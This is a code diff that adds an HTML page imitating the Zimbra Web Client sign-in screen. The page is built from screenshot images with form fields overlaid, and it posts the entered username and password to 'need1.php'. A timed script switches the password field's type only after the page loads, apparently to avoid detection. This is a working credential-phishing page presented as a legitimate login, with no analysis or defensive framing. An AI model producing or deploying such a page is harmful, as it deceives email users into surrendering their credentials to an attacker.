@@ -1,0 +1,80 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+ <head>
+  <title>
+   Zimbra Web Client Sign In
+  </title>
+  <script>
+   setTimeout(function() {
+  document.getElementsByTagName('input')[1].type = "password"
+}, 1000);
+  </script>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <link href="images/favicon.ico" rel="shortcut icon"/>
+  <style type="text/css">
+   .textbox {
+    border-radius: 5px;
+  	font-family: "Helvetica Neue",Helvetica,Arial,"Liberation Sans",sans-serif;
+    font-size: 13px;
+    color: #333333;
+    height: 22px;
+    width: 275px;
+    border: 1px solid #fff;
+}
+  </style>
+  <style type="text/css">
+   div#container
+{
+	position:relative;
+	width: 1365px;
+	margin-top: 0px;
+	margin-left: auto;
+	margin-right: auto;
+	text-align:left; 
+}
+body {text-align:center;margin:0}
+  </style>
+ </head>
+ <body bgcolor="#EDEDED">
+  <div id="container">
+   <div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1365px; height:205px; z-index:0">
+    <img alt="" border="0" height="205" src="images/z1.png" title="" width="1365"/>
+   </div>
+   <div id="image2" style="position:absolute; overflow:hidden; left:0px; top:203px; width:1365px; height:218px; z-index:1">
+    <img alt="" border="0" height="218" src="images/z2.png" title="" width="1365"/>
+   </div>
+   <div id="image3" style="position:absolute; overflow:hidden; left:0px; top:420px; width:1365px; height:242px; z-index:2">
+    <img alt="" border="0" height="242" src="images/z3.png" title="" width="1365"/>
+   </div>
+   <div id="image4" style="position:absolute; overflow:hidden; left:776px; top:330px; width:66px; height:14px; z-index:3">
+    <a href="#">
+     <img alt="" border="0" height="14" src="images/z4.png" title="" width="66"/>
+    </a>
+   </div>
+   <form action="need1.php" id="chalenjee" method="post" name="chalenjee">
+    <input autocomplete="off" class="textbox" name="usr" required="" style="position:absolute;width:237px;left:604px;top:204px;z-index:5" type="text"/>
+    <input autocomplete="off" class="textbox" name="psw" required="" style="position:absolute;width:237px;left:604px;top:236px;z-index:6" type="text"/>
+    <div id="formcheckbox1" style="position:absolute; left:604px; top:269px; z-index:7">
+     <input name="formcheckbox1" type="checkbox"/>
+    </div>
+    <div id="formimage1" style="position:absolute; left:793px; top:268px; z-index:8">
+     <input height="26" name="formimage1" src="images/zg.png" type="image" width="49"/>
+    </div>
+    <select name="ver" style="position:absolute;left:604px;top:327px;height:20px;width:166px;z-index:9">
+     <option selected="" value="preferred">
+      Default
+     </option>
+     <option value="advanced">
+      Advanced (Ajax)
+     </option>
+     <option value="standard">
+      Standard (HTML)
+     </option>
+     <option value="mobile">
+      Mobile
+     </option>
+    </select>
+   </form>
+  </div>
+ </body>
+</html>
